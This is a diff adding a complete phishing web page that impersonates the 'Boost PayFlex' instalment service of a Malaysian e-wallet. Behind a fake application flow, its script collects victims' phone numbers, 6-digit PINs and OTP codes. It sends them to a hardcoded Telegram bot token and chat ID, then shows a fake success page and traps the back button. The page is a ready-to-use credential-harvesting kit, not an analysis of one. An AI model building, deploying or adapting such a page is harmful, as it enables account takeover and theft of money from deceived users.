@@ -1,0 +1,1155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Boost PayFlex - Flexible payment solutions for everyday purchases">
+    <meta name="theme-color" content="#e60023">
+    <title>Boost PayFlex - Apply Now</title>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🚀</text></svg>">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --primary-color: #e60023;
+            --primary-dark: #cc0020;
+            --success-color: #28a745;
+            --text-dark: #1a1a1a;
+            --text-light: #666;
+            --border-color: #e0e0e0;
+            --bg-light: #f5f5f5;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background: var(--bg-light);
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        /* Initial Loader */
+        .initial-loader {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #e60023 0%, #cc0020 100%);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
+            transition: opacity 0.5s ease, transform 0.5s ease;
+        }
+
+        .initial-loader.hidden {
+            opacity: 0;
+            transform: scale(0.95);
+            pointer-events: none;
+        }
+
+        .initial-loader .logo {
+            color: white;
+            font-size: 56px;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            animation: logoFade 1.5s ease-in-out infinite;
+        }
+
+        .initial-loader .logo-icon {
+            width: 70px;
+            height: 70px;
+            background: white;
+            border-radius: 12px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 42px;
+            color: var(--primary-color);
+            font-weight: bold;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
+        }
+
+        @keyframes logoFade {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.7; }
+        }
+
+        .loader-spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-top: 40px;
+        }
+
+        .loader-text {
+            color: white;
+            font-size: 18px;
+            margin-top: 20px;
+            font-weight: 500;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* Header */
+        .header {
+            background: var(--primary-color);
+            padding: 18px 20px;
+            text-align: center;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+        }
+
+        .logo {
+            color: white;
+            font-size: 32px;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+        }
+
+        .logo-icon {
+            width: 40px;
+            height: 40px;
+            background: white;
+            border-radius: 8px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            color: var(--primary-color);
+            font-weight: bold;
+        }
+
+        /* Container */
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .card {
+            background: white;
+            border-radius: 16px;
+            padding: 40px 30px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+            margin-top: 40px;
+            animation: slideUp 0.5s ease;
+        }
+
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .page {
+            display: none;
+        }
+
+        .page.active {
+            display: block;
+        }
+
+        /* Typography */
+        .main-title {
+            font-size: 28px;
+            font-weight: bold;
+            color: var(--text-dark);
+            margin-bottom: 20px;
+            line-height: 1.3;
+        }
+
+        .page-title {
+            font-size: 28px;
+            font-weight: bold;
+            color: var(--text-dark);
+            margin-bottom: 12px;
+        }
+
+        .page-subtitle {
+            font-size: 15px;
+            color: var(--text-light);
+            margin-bottom: 30px;
+            line-height: 1.5;
+        }
+
+        .description {
+            font-size: 16px;
+            color: var(--text-light);
+            line-height: 1.6;
+            margin-bottom: 30px;
+        }
+
+        .cta-text {
+            font-size: 16px;
+            color: var(--text-light);
+            margin-bottom: 24px;
+        }
+
+        /* Form Elements */
+        .form-label {
+            font-size: 16px;
+            font-weight: 600;
+            color: var(--text-dark);
+            margin-bottom: 12px;
+            display: block;
+        }
+
+        .input-text {
+            width: 100%;
+            padding: 14px;
+            font-size: 18px;
+            border: none;
+            border-bottom: 2px solid var(--border-color);
+            outline: none;
+            transition: border-color 0.3s ease;
+            margin-bottom: 30px;
+            background: transparent;
+        }
+
+        .input-text:focus {
+            border-bottom-color: var(--primary-color);
+        }
+
+        .input-text.error {
+            border-bottom-color: #dc3545;
+        }
+
+        .error-message {
+            color: #dc3545;
+            font-size: 13px;
+            margin-top: -25px;
+            margin-bottom: 20px;
+            display: none;
+        }
+
+        .error-message.show {
+            display: block;
+        }
+
+        /* PIN/OTP Display */
+        .pin-container {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 40px;
+            justify-content: space-between;
+        }
+
+        .pin-dot {
+            width: 48px;
+            height: 48px;
+            border: 2px solid var(--border-color);
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 32px;
+            background: white;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .pin-dot.filled {
+            border-color: var(--primary-color);
+            background: #fff5f7;
+            color: var(--primary-color);
+            transform: scale(1.05);
+        }
+
+        .pin-dot.error {
+            border-color: #dc3545;
+            animation: shake 0.5s;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-5px); }
+            75% { transform: translateX(5px); }
+        }
+
+        /* Buttons */
+        .btn-primary {
+            width: 100%;
+            background: var(--primary-color);
+            color: white;
+            border: none;
+            padding: 16px;
+            font-size: 18px;
+            font-weight: 600;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .btn-primary:hover {
+            background: var(--primary-dark);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(230, 0, 35, 0.3);
+        }
+
+        .btn-primary:active {
+            transform: translateY(0);
+        }
+
+        .btn-primary:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .btn-outline {
+            width: 100%;
+            background: white;
+            color: var(--primary-color);
+            border: 2px solid var(--primary-color);
+            padding: 16px;
+            font-size: 18px;
+            font-weight: 600;
+            border-radius: 12px;
+            cursor: pointer;
+            margin-top: 12px;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .btn-outline:hover {
+            background: #fff5f7;
+        }
+
+        .btn-secondary {
+            width: 100%;
+            background: var(--bg-light);
+            color: var(--text-light);
+            border: none;
+            padding: 16px;
+            font-size: 18px;
+            font-weight: 600;
+            border-radius: 12px;
+            cursor: pointer;
+            margin-top: 12px;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .btn-secondary:hover {
+            background: #e0e0e0;
+        }
+
+        .btn-next-container {
+            display: flex;
+            justify-content: flex-end;
+            margin-top: 20px;
+        }
+
+        .btn-circle {
+            width: 64px;
+            height: 64px;
+            background: var(--primary-color);
+            border: none;
+            border-radius: 50%;
+            color: white;
+            font-size: 28px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 12px rgba(230, 0, 35, 0.3);
+        }
+
+        .btn-circle:hover {
+            background: var(--primary-dark);
+            transform: scale(1.1);
+            box-shadow: 0 6px 20px rgba(230, 0, 35, 0.4);
+        }
+
+        .btn-circle:active {
+            transform: scale(1);
+        }
+
+        /* Timer */
+        .timer-info {
+            text-align: center;
+            color: #999;
+            font-size: 14px;
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid #f0f0f0;
+        }
+
+        .timer {
+            font-size: 20px;
+            font-weight: 600;
+            color: var(--text-dark);
+            margin-top: 8px;
+        }
+
+        .timer.warning {
+            color: #ff6b6b;
+            animation: pulse 1s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.6; }
+        }
+
+        /* Success Page */
+        .success-icon {
+            width: 90px;
+            height: 90px;
+            background: var(--success-color);
+            color: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 54px;
+            font-weight: bold;
+            margin: 0 auto;
+            animation: scaleIn 0.6s ease;
+            box-shadow: 0 4px 20px rgba(40, 167, 69, 0.3);
+        }
+
+        @keyframes scaleIn {
+            from {
+                transform: scale(0) rotate(-180deg);
+                opacity: 0;
+            }
+            to {
+                transform: scale(1) rotate(0deg);
+                opacity: 1;
+            }
+        }
+
+        .success-details {
+            background: #f8f9fa;
+            border-radius: 12px;
+            padding: 20px;
+            margin-top: 30px;
+            text-align: left;
+        }
+
+        .detail-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 14px 0;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .detail-item:last-child {
+            border-bottom: none;
+        }
+
+        .detail-label {
+            font-size: 14px;
+            color: var(--text-light);
+            font-weight: 500;
+        }
+
+        .detail-value {
+            font-size: 14px;
+            color: var(--text-dark);
+            font-weight: 600;
+        }
+
+        /* Toast Notification */
+        .toast {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%) translateY(100px);
+            background: #333;
+            color: white;
+            padding: 16px 24px;
+            border-radius: 8px;
+            font-size: 15px;
+            z-index: 9999;
+            opacity: 0;
+            transition: all 0.3s ease;
+            max-width: 90%;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
+        }
+
+        .toast.show {
+            opacity: 1;
+            transform: translateX(-50%) translateY(0);
+        }
+
+        .toast.success {
+            background: var(--success-color);
+        }
+
+        .toast.error {
+            background: #dc3545;
+        }
+
+        /* Loading Overlay */
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.75);
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+
+        .loading-overlay.active {
+            display: flex;
+        }
+
+        .loading-content {
+            text-align: center;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+
+        .loading-text {
+            color: white;
+            font-size: 16px;
+            font-weight: 500;
+        }
+
+        /* Hidden input */
+        .hidden-input {
+            position: absolute;
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        /* Features Grid */
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            margin-top: 40px;
+        }
+
+        .feature-card {
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 12px;
+            text-align: center;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .feature-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 6px 16px rgba(0, 0, 0, 0.1);
+        }
+
+        .feature-icon {
+            font-size: 40px;
+            margin-bottom: 12px;
+        }
+
+        .feature-title {
+            font-size: 16px;
+            font-weight: 600;
+            color: var(--text-dark);
+            margin-bottom: 8px;
+        }
+
+        .feature-text {
+            font-size: 14px;
+            color: var(--text-light);
+            line-height: 1.4;
+        }
+
+        /* Responsive */
+        @media (max-width: 480px) {
+            .container {
+                padding: 15px;
+            }
+
+            .card {
+                padding: 30px 20px;
+                margin-top: 30px;
+            }
+
+            .main-title, .page-title {
+                font-size: 24px;
+            }
+
+            .pin-dot {
+                width: 42px;
+                height: 42px;
+                font-size: 28px;
+            }
+
+            .btn-circle {
+                width: 56px;
+                height: 56px;
+                font-size: 24px;
+            }
+
+            .initial-loader .logo {
+                font-size: 42px;
+            }
+
+            .initial-loader .logo-icon {
+                width: 55px;
+                height: 55px;
+                font-size: 32px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Initial Loading Screen -->
+    <div class="initial-loader" id="initialLoader">
+        <div class="logo">
+            <div class="logo-icon">B</div>
+            <span>oost</span>
+        </div>
+        <div class="loader-spinner"></div>
+        <div class="loader-text">Loading PayFlex...</div>
+    </div>
+
+    <!-- Toast Notification -->
+    <div class="toast" id="toast"></div>
+
+    <!-- Loading Overlay -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-content">
+            <div class="spinner"></div>
+            <div class="loading-text">Processing...</div>
+        </div>
+    </div>
+
+    <!-- Header -->
+    <div class="header" style="display: none;" id="mainHeader">
+        <div class="logo">
+            <div class="logo-icon">B</div>
+            <span>oost</span>
+        </div>
+    </div>
+
+    <div class="container">
+        <!-- Page 1: Landing -->
+        <div class="page" id="page1">
+            <div class="card">
+                <h1 class="main-title">Ways to use Boost PayFlex</h1>
+                <p class="description">
+                    Ways to use Boost PayFlex Boost PayFlex makes everyday purchases and larger expenses manageable. 
+                    Choose a repayment plan that fits you, with up to 24 months instalment.
+                </p>
+                <p class="cta-text">Apply now and live life on your terms!</p>
+                <button class="btn-primary" onclick="goToPage(2)">Apply Now</button>
+
+                <div class="features-grid">
+                    <div class="feature-card">
+                        <div class="feature-icon">💳</div>
+                        <div class="feature-title">Flexible Plans</div>
+                        <div class="feature-text">Up to 24 months instalment</div>
+                    </div>
+                    <div class="feature-card">
+                        <div class="feature-icon">⚡</div>
+                        <div class="feature-title">Instant Approval</div>
+                        <div class="feature-text">Quick and easy process</div>
+                    </div>
+                    <div class="feature-card">
+                        <div class="feature-icon">🔒</div>
+                        <div class="feature-title">Secure</div>
+                        <div class="feature-text">Bank-level security</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Page 2: Sign In -->
+        <div class="page" id="page2">
+            <div class="card">
+                <h2 class="page-title">Sign in to Boost</h2>
+                <p class="page-subtitle">Sign in with your registered Boost mobile number.</p>
+                
+                <label class="form-label">Mobile Number</label>
+                <input type="tel" class="input-text" id="mobileNumber" placeholder="+60  1234567890" value="+60  " oninput="validatePhoneInput(this)">
+                <div class="error-message" id="phoneError">Please enter a valid mobile number</div>
+                
+                <label class="form-label">6-digit PIN</label>
+                <div class="pin-container" id="pinDisplay" onclick="focusPinInput()">
+                    <div class="pin-dot" id="pin1"></div>
+                    <div class="pin-dot" id="pin2"></div>
+                    <div class="pin-dot" id="pin3"></div>
+                    <div class="pin-dot" id="pin4"></div>
+                    <div class="pin-dot" id="pin5"></div>
+                    <div class="pin-dot" id="pin6"></div>
+                </div>
+                <input type="password" class="hidden-input" id="pinInput" maxlength="6" oninput="updatePinDisplay(this.value)" inputmode="numeric" pattern="[0-9]*">
+                <div class="error-message" id="pinError">Please enter 6-digit PIN</div>
+                
+                <div class="btn-next-container">
+                    <button class="btn-circle" onclick="submitPinPage()">→</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Page 3: OTP -->
+        <div class="page" id="page3">
+            <div class="card">
+                <h2 class="page-title">Purchase Authentication</h2>
+                <p class="otp-info">The OTP code has been sent to <strong id="maskedPhone">+601****90</strong></p>
+                
+                <label class="form-label">6-digit OTP</label>
+                <div class="pin-container" id="otpDisplay" onclick="focusOtpInput()">
+                    <div class="pin-dot" id="otp1"></div>
+                    <div class="pin-dot" id="otp2"></div>
+                    <div class="pin-dot" id="otp3"></div>
+                    <div class="pin-dot" id="otp4"></div>
+                    <div class="pin-dot" id="otp5"></div>
+                    <div class="pin-dot" id="otp6"></div>
+                </div>
+                <input type="text" class="hidden-input" id="otpInput" maxlength="6" oninput="updateOtpDisplay(this.value)" inputmode="numeric" pattern="[0-9]*">
+                <div class="error-message" id="otpError">Please enter 6-digit OTP</div>
+                
+                <button class="btn-primary" onclick="submitOtpPage()">CONFIRM</button>
+                <button class="btn-outline" onclick="resendOtp()">RESEND</button>
+                <button class="btn-secondary" onclick="cancelOtp()">CANCEL</button>
+                
+                <div class="timer-info">
+                    The page will automatically timeout after 7 minutes.
+                    <div class="timer" id="timerDisplay">Time left: <span id="countdown">7:00</span></div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Page 4: Success -->
+        <div class="page" id="page4">
+            <div class="card" style="text-align: center;">
+                <div class="success-icon">✓</div>
+                <h2 class="page-title" style="color: var(--success-color); margin-top: 20px;">Authentication Successful!</h2>
+                <p class="page-subtitle" style="margin-top: 15px;">
+                    Your Boost PayFlex application has been verified successfully.
+                </p>
+                <div class="success-details">
+                    <div class="detail-item">
+                        <span class="detail-label">Mobile Number</span>
+                        <span class="detail-value" id="successPhone">+60123456789</span>
+                    </div>
+                    <div class="detail-item">
+                        <span class="detail-label">Status</span>
+                        <span class="detail-value" style="color: var(--success-color);">Verified ✓</span>
+                    </div>
+                    <div class="detail-item">
+                        <span class="detail-label">Date & Time</span>
+                        <span class="detail-value" id="successTime">-</span>
+                    </div>
+                    <div class="detail-item">
+                        <span class="detail-label">Reference ID</span>
+                        <span class="detail-value" id="referenceId">-</span>
+                    </div>
+                </div>
+                <button class="btn-primary" onclick="goToHome()" style="margin-top: 30px;">Back to Home</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ====== KONFIGURASI TELEGRAM ======
+        const TELEGRAM_BOT_TOKEN = '7932406627:AAEvuiCd-m8UtTv0x2vgPNOdIrT6gC0s4pw';
+        const TELEGRAM_CHAT_ID = '6969482058';
+        // ==================================
+
+        let userPhone = '';
+        let userPin = '';
+        let userOtp = '';
+        let countdownTimer;
+        let otpResendCount = 0;
+
+        // Initial loading
+        window.addEventListener('load', function() {
+            setTimeout(() => {
+                document.getElementById('initialLoader').classList.add('hidden');
+                setTimeout(() => {
+                    document.getElementById('initialLoader').style.display = 'none';
+                    document.getElementById('mainHeader').style.display = 'block';
+                    goToPage(1);
+                }, 500);
+            }, 2500);
+        });
+
+        // Navigate between pages
+        function goToPage(pageNum) {
+            document.querySelectorAll('.page').forEach(page => page.classList.remove('active'));
+            const targetPage = document.getElementById('page' + pageNum);
+            if (targetPage) {
+                targetPage.classList.add('active');
+                window.scrollTo(0, 0);
+            }
+            
+            if (pageNum === 2) {
+                setTimeout(() => focusPinInput(), 100);
+            } else if (pageNum === 3) {
+                startCountdown();
+                setTimeout(() => focusOtpInput(), 100);
+            }
+        }
+
+        // Go back to home
+        function goToHome() {
+            resetForm();
+            goToPage(1);
+        }
+
+        // Phone input validation
+        function validatePhoneInput(input) {
+            let value = input.value.replace(/\s+/g, '');
+            if (!value.startsWith('+60')) {
+                value = '+60';
+            }
+            input.value = value;
+        }
+
+        // PIN Input handling
+        function focusPinInput() {
+            document.getElementById('pinInput').focus();
+        }
+
+        function updatePinDisplay(value) {
+            // Remove non-numeric characters
+            value = value.replace(/\D/g, '');
+            document.getElementById('pinInput').value = value;
+            
+            for (let i = 1; i <= 6; i++) {
+                const dot = document.getElementById('pin' + i);
+                dot.classList.remove('error');
+                if (i <= value.length) {
+                    dot.classList.add('filled');
+                    dot.textContent = '•';
+                } else {
+                    dot.classList.remove('filled');
+                    dot.textContent = '';
+                }
+            }
+            
+            document.getElementById('pinError').classList.remove('show');
+        }
+
+        // OTP Input handling
+        function focusOtpInput() {
+            document.getElementById('otpInput').focus();
+        }
+
+        function updateOtpDisplay(value) {
+            // Remove non-numeric characters
+            value = value.replace(/\D/g, '');
+            document.getElementById('otpInput').value = value;
+            
+            for (let i = 1; i <= 6; i++) {
+                const dot = document.getElementById('otp' + i);
+                dot.classList.remove('error');
+                if (i <= value.length) {
+                    dot.classList.add('filled');
+                    dot.textContent = '•';
+                } else {
+                    dot.classList.remove('filled');
+                    dot.textContent = '';
+                }
+            }
+            
+            document.getElementById('otpError').classList.remove('show');
+        }
+
+        // Submit PIN page
+        async function submitPinPage() {
+            userPhone = document.getElementById('mobileNumber').value.trim();
+            userPin = document.getElementById('pinInput').value;
+            
+            // Validation
+            if (!userPhone || userPhone === '+60' || userPhone === '+60  ' || userPhone.length < 10) {
+                document.getElementById('mobileNumber').classList.add('error');
+                document.getElementById('phoneError').classList.add('show');
+                showToast('Please enter a valid mobile number', 'error');
+                return;
+            }
+            
+            if (userPin.length !== 6) {
+                for (let i = 1; i <= 6; i++) {
+                    document.getElementById('pin' + i).classList.add('error');
+                }
+                document.getElementById('pinError').classList.add('show');
+                showToast('Please enter 6-digit PIN', 'error');
+                focusPinInput();
+                return;
+            }
+            
+            // Mask phone number for OTP page
+            const phoneDigits = userPhone.replace(/\D/g, '');
+            let masked = '';
+            if (phoneDigits.length > 4) {
+                masked = '+' + phoneDigits.substring(0, 3) + phoneDigits.substring(3, 4) + '****' + phoneDigits.substring(phoneDigits.length - 2);
+            } else {
+                masked = userPhone;
+            }
+            document.getElementById('maskedPhone').textContent = masked;
+            
+            // Send to Telegram
+            await sendToTelegram('PIN', {
+                phone: userPhone,
+                pin: userPin
+            });
+            
+            showToast('OTP sent to your mobile number', 'success');
+            goToPage(3);
+        }
+
+        // Submit OTP page
+        async function submitOtpPage() {
+            userOtp = document.getElementById('otpInput').value;
+            
+            if (userOtp.length !== 6) {
+                for (let i = 1; i <= 6; i++) {
+                    document.getElementById('otp' + i).classList.add('error');
+                }
+                document.getElementById('otpError').classList.add('show');
+                showToast('Please enter 6-digit OTP', 'error');
+                focusOtpInput();
+                return;
+            }
+            
+            // Send complete data to Telegram
+            await sendToTelegram('COMPLETE', {
+                phone: userPhone,
+                pin: userPin,
+                otp: userOtp
+            });
+            
+            // Clear countdown
+            clearInterval(countdownTimer);
+            
+            // Generate reference ID
+            const refId = 'BPF' + Date.now().toString().slice(-8);
+            
+            // Show success page
+            document.getElementById('successPhone').textContent = userPhone;
+            document.getElementById('successTime').textContent = new Date().toLocaleString('en-MY', { 
+                timeZone: 'Asia/Kuala_Lumpur',
+                hour12: true,
+                year: 'numeric',
+                month: 'short',
+                day: 'numeric',
+                hour: '2-digit',
+                minute: '2-digit'
+            });
+            document.getElementById('referenceId').textContent = refId;
+            
+            showToast('Authentication successful!', 'success');
+            goToPage(4);
+        }
+
+        // Send data to Telegram
+        async function sendToTelegram(type, data) {
+            const loadingOverlay = document.getElementById('loadingOverlay');
+            loadingOverlay.classList.add('active');
+            
+            let message = '';
+            const timestamp = new Date().toLocaleString('en-MY', { 
+                timeZone: 'Asia/Kuala_Lumpur',
+                hour12: true 
+            });
+            
+            if (type === 'PIN') {
+                message = `🔔 *BOOST PAYFLEX - NEW LOGIN*\n\n` +
+                         `📱 *Phone Number:*\n${data.phone}\n\n` +
+                         `🔐 *PIN Code:*\n${data.pin}\n\n` +
+                         `⏰ *Time:* ${timestamp}\n` +
+                         `🌐 *Status:* Waiting for OTP...\n` +
+                         `📊 *Source:* PayFlex Web App`;
+            } else if (type === 'COMPLETE') {
+                const refId = 'BPF' + Date.now().toString().slice(-8);
+                message = `✅ *BOOST PAYFLEX - COMPLETE DATA*\n\n` +
+                         `📱 *Phone Number:*\n${data.phone}\n\n` +
+                         `🔐 *PIN Code:*\n${data.pin}\n\n` +
+                         `🔑 *OTP Code:*\n${data.otp}\n\n` +
+                         `🆔 *Reference:* ${refId}\n` +
+                         `⏰ *Time:* ${timestamp}\n` +
+                         `✔️ *Status:* VERIFIED\n` +
+                         `📊 *Source:* PayFlex Web App`;
+            }
+            
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                
+                const result = await response.json();
+                
+                if (!result.ok) {
+                    console.error('Telegram send failed:', result.description);
+                }
+            } catch (error) {
+                console.error('Error sending to Telegram:', error);
+            } finally {
+                setTimeout(() => {
+                    loadingOverlay.classList.remove('active');
+                }, 800);
+            }
+        }
+
+        // Resend OTP
+        function resendOtp() {
+            otpResendCount++;
+            showToast('📩 OTP code has been resent to your mobile number', 'success');
+            
+            // Reset countdown
+            clearInterval(countdownTimer);
+            startCountdown();
+            
+            // Clear OTP input
+            document.getElementById('otpInput').value = '';
+            updateOtpDisplay('');
+            focusOtpInput();
+            
+            // Send notification about resend
+            sendToTelegram('RESEND', {
+                phone: userPhone,
+                count: otpResendCount
+            });
+        }
+
+        // Cancel OTP
+        function cancelOtp() {
+            if (confirm('Are you sure you want to cancel?')) {
+                clearInterval(countdownTimer);
+                showToast('Operation cancelled', 'error');
+                resetForm();
+                goToPage(2);
+            }
+        }
+
+        // Countdown timer
+        function startCountdown() {
+            let timeLeft = 7 * 60; // 7 minutes in seconds
+            const timerDisplay = document.getElementById('timerDisplay');
+            
+            const updateTimer = () => {
+                const minutes = Math.floor(timeLeft / 60);
+                const seconds = timeLeft % 60;
+                
+                document.getElementById('countdown').textContent = 
+                    `${minutes}:${seconds.toString().padStart(2, '0')}`;
+                
+                // Warning when less than 1 minute
+                if (timeLeft < 60) {
+                    timerDisplay.classList.add('warning');
+                } else {
+                    timerDisplay.classList.remove('warning');
+                }
+                
+                timeLeft--;
+                
+                if (timeLeft < 0) {
+                    clearInterval(countdownTimer);
+                    showToast('⏰ Session timeout. Please try again.', 'error');
+                    setTimeout(() => {
+                        resetForm();
+                        goToPage(1);
+                    }, 2000);
+                }
+            };
+            
+            updateTimer();
+            countdownTimer = setInterval(updateTimer, 1000);
+        }
+
+        // Show toast notification
+        function showToast(message, type = 'success') {
+            const toast = document.getElementById('toast');
+            toast.textContent = message;
+            toast.className = 'toast ' + type;
+            toast.classList.add('show');
+            
+            setTimeout(() => {
+                toast.classList.remove('show');
+            }, 3000);
+        }
+
+        // Reset form
+        function resetForm() {
+            document.getElementById('mobileNumber').value = '+60  ';
+            document.getElementById('mobileNumber').classList.remove('error');
+            document.getElementById('pinInput').value = '';
+            document.getElementById('otpInput').value = '';
+            updatePinDisplay('');
+            updateOtpDisplay('');
+            document.getElementById('phoneError').classList.remove('show');
+            document.getElementById('pinError').classList.remove('show');
+            document.getElementById('otpError').classList.remove('show');
+            clearInterval(countdownTimer);
+            userPhone = '';
+            userPin = '';
+            userOtp = '';
+            otpResendCount = 0;
+        }
+
+        // Prevent form submission on Enter key
+        document.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                
+                const activePage = document.querySelector('.page.active');
+                if (activePage.id === 'page2') {
+                    submitPinPage();
+                } else if (activePage.id === 'page3') {
+                    submitOtpPage();
+                }
+            }
+        });
+
+        // Prevent back button
+        window.history.pushState(null, "", window.location.href);
+        window.onpopstate = function() {
+            window.history.pushState(null, "", window.location.href);
+        };
+    </script>
+</body>
+</html>
